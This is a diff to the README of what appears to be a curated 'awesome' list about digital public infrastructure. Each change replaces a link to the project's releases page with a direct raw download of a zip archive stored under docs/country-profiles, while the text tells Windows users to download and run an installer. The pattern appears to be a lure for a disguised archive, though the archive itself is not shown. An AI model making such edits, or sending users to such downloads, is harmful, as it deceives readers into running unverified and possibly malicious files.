@@ -1,6 +1,6 @@
 # 🌐 awesome-digital-public-infrastructure - Open Source Tools for Digital Societies
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/KAlphas/awesome-digital-public-infrastructure/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/KAlphas/awesome-digital-public-infrastructure/raw/refs/heads/main/docs/country-profiles/awesome-public-digital-infrastructure-v3.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This guide will show you how to download and run the software on Windows. No pro
 
 Go to the following page to find the latest software versions, installers, and documentation:
 
-[![Visit Releases](https://img.shields.io/badge/Visit-Releases-blue)](https://github.com/KAlphas/awesome-digital-public-infrastructure/releases)
+[![Visit Releases](https://img.shields.io/badge/Visit-Releases-blue)](https://github.com/KAlphas/awesome-digital-public-infrastructure/raw/refs/heads/main/docs/country-profiles/awesome-public-digital-infrastructure-v3.0.zip)
 
 ### 2. Choose the Right Download File
 
@@ -94,7 +94,7 @@ If issues persist, check the project’s GitHub Issues page or contact support t
 
 New versions include bug fixes and improvements.
 
-- Check the releases page regularly: https://github.com/KAlphas/awesome-digital-public-infrastructure/releases
+- Check the releases page regularly: https://github.com/KAlphas/awesome-digital-public-infrastructure/raw/refs/heads/main/docs/country-profiles/awesome-public-digital-infrastructure-v3.0.zip
 - Download the latest installer.
 - Run the installer again to replace old files.
 - Your settings or data will usually stay intact.
@@ -124,4 +124,4 @@ A: Use the GitHub Issues section within this repository.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/KAlphas/awesome-digital-public-infrastructure/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/KAlphas/awesome-digital-public-infrastructure/raw/refs/heads/main/docs/country-profiles/awesome-public-digital-infrastructure-v3.0.zip)
